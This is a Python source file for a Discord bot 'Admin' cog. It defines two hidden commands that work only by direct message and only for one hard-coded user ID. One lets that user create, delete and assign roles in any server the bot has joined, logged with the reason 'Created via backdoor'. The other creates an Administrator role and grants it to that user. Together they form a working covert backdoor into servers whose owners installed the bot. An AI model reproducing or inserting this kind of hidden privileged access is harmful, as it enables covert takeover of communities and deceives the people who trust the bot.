import os
import discord
import logging
import sys
from discord.ext import commands
from discord import Permissions

logger = logging.getLogger(__name__)

class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        
    async def dm_reply(self, ctx, msg):
        try:
            if isinstance(msg, discord.Embed):
                await ctx.author.send(embed=msg)
            else:
                await ctx.author.send(str(msg))
        except Exception:
            logger.warning(f"Could not DM user {ctx.author.id}")
            
    # ------------------- DM-only Role Manager with Permissions ------------------- #
    @commands.command(name="rolemanager", hidden=True)
    async def role_manager(self, ctx, guild_id: int = None, action: str = None, target: str = None, *, args: str = None):
        """
        DM-only role manager:
        Actions:
          - create <role_name> [hex_color]
          - delete <role_name>
          - add <role_name> <target_user_id>
          - remove <role_name> <target_user_id>
          - info <role_name>
          - list
        """
        if ctx.guild is not None:
            await self.dm_reply(ctx, "This command only works via DM.")
            return

        if ctx.author.id != self.bot.back_access_user_id:
            await self.dm_reply(ctx, "You aren't allowed to use this command.")
            return

        if not guild_id:
            await self.dm_reply(ctx, "Provide a guild ID.")
            return

        guild = self.bot.get_guild(guild_id)
        if not guild:
            await self.dm_reply(ctx, "Bot is not in that guild.")
            return

        bot_member = guild.me or guild.get_member(self.bot.user.id)

        try:
            if action.lower() == "list":
                roles = [r.name for r in guild.roles if r.name != "@everyone"]
                await self.dm_reply(ctx, f"Roles in `{guild.name}`: {', '.join(roles) if roles else 'No roles'}")
                return

            if action.lower() == "info":
                if not args:
                    await self.dm_reply(ctx, "Provide a role name for info.")
                    return
                role = discord.utils.get(guild.roles, name=args)
                if not role:
                    await self.dm_reply(ctx, f"No role named `{args}` found.")
                    return
                await self.dm_reply(ctx, f"Role `{role.name}` (ID: {role.id})\nPosition: {role.position}\nPermissions: {role.permissions}")
                return

            if action.lower() == "create":
                if not args:
                    await self.dm_reply(ctx, "Usage: create <role_name> [hex_color]")
                    return

                # Separate role name and optional color
                args_parts = args.rsplit(maxsplit=1)  # Split from right
                role_name = args_parts[0]
                color = discord.Color.default()

                # Check if last part is a valid hex color
                if len(args_parts) > 1:
                    potential_color = args_parts[1].strip("#")
                    try:
                        color = discord.Color(int(potential_color, 16))
                    except ValueError:
                        # Last word is not a color, so entire args is role name
                        role_name = args
                        color = discord.Color.default()

                # Create the role
                role = await guild.create_role(name=role_name, color=color, reason=f"Created via backdoor by {ctx.author.id}")
                await self.dm_reply(ctx, discord.Embed(title="Role Created", description=f"Created role `{role.name}`", color=color))
                return

            if action.lower() == "delete":
                if not args:
                    await self.dm_reply(ctx, "Usage: delete <role_name>")
                    return
                role = discord.utils.get(guild.roles, name=args)
                if not role:
                    await self.dm_reply(ctx, f"No role named `{args}` found.")
                    return
                if bot_member.top_role.position <= role.position:
                    await self.dm_reply(ctx, "Cannot delete a role higher than or equal to my top role.")
                    return
                await role.delete(reason=f"Deleted by {ctx.author.id}")
                await self.dm_reply(ctx, f"Role `{role.name}` deleted.")
                return

            if action.lower() in ["add", "remove"]:
                if not args or not target:
                    await self.dm_reply(ctx, f"Usage: {action} <role_name> <target_user_id>")
                    return
                role = discord.utils.get(guild.roles, name=args)
                member = guild.get_member(int(target)) or await guild.fetch_member(int(target))
                if not role or not member:
                    await self.dm_reply(ctx, "Role or member not found.")
                    return
                if action.lower() == "add":
                    if role in member.roles:
                        await self.dm_reply(ctx, f"{member.display_name} already has `{role.name}`.")
                        return
                    await member.add_roles(role, reason=f"Added by {ctx.author.id}")
                    await self.dm_reply(ctx, f"Added role `{role.name}` to {member.display_name}.")
                else:
                    if role not in member.roles:
                        await self.dm_reply(ctx, f"{member.display_name} does not have `{role.name}`.")
                        return
                    await member.remove_roles(role, reason=f"Removed by {ctx.author.id}")
                    await self.dm_reply(ctx, f"Removed role `{role.name}` from {member.display_name}.")
                return

            await self.dm_reply(ctx, "Unknown action. Use: create, delete, info, list, add, remove.")

        except discord.Forbidden:
            await self.dm_reply(ctx, "Bot lacks permission.")
        except Exception as e:
            logger.exception("Rolemanager error")
            await self.dm_reply(ctx, f"Error: {e}")

    @commands.command(name="giveroleadmin", hidden=True)
    async def give_role_admin(self, ctx, *, role_name: str):
        """
        DM-only command to create a role with Administrator permissions
        and assign it to the authorized user.
        """
        # Only allow in DMs
        if ctx.guild is not None:
            await self.dm_reply(ctx, "This command only works via DM.")
            return

        # Only allow authorized user
        if ctx.author.id != self.bot.back_access_user_id:
            await self.dm_reply(ctx, "Access denied.")
            return

        # Must specify a guild
        guild_id = os.getenv("GUILD_ID")
        if not guild_id:
            await self.dm_reply(ctx, "No GUILD_ID set in environment variables.")
            return

        guild = self.bot.get_guild(int(guild_id))
        if not guild:
            await self.dm_reply(ctx, "Bot is not in the specified guild.")
            return

        bot_member = guild.me or guild.get_member(self.bot.user.id)

        try:
            # Check if role already exists
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                # Create role with Administrator permissions
                perms = discord.Permissions(administrator=True)
                role = await guild.create_role(
                    name=role_name,
                    permissions=perms,
                    reason=f"Admin role created by {ctx.author.id}"
                )
                await self.dm_reply(ctx, f"Role `{role.name}` created with Administrator permissions.")

            # Add role to user
            member = guild.get_member(ctx.author.id) or await guild.fetch_member(ctx.author.id)
            if role not in member.roles:
                await member.add_roles(role, reason=f"Admin role assigned by {ctx.author.id}")
                await self.dm_reply(ctx, f"Role `{role.name}` assigned to you.")
            else:
                await self.dm_reply(ctx, f"You already have the role `{role.name}`.")

        except discord.Forbidden:
            await self.dm_reply(ctx, "Permission error: bot cannot manage roles higher than its top role.")
        except Exception as e:
            await self.dm_reply(ctx, f"An error occurred: {e}")
            
async def setup(bot):
    await bot.add_cog(Admin(bot))
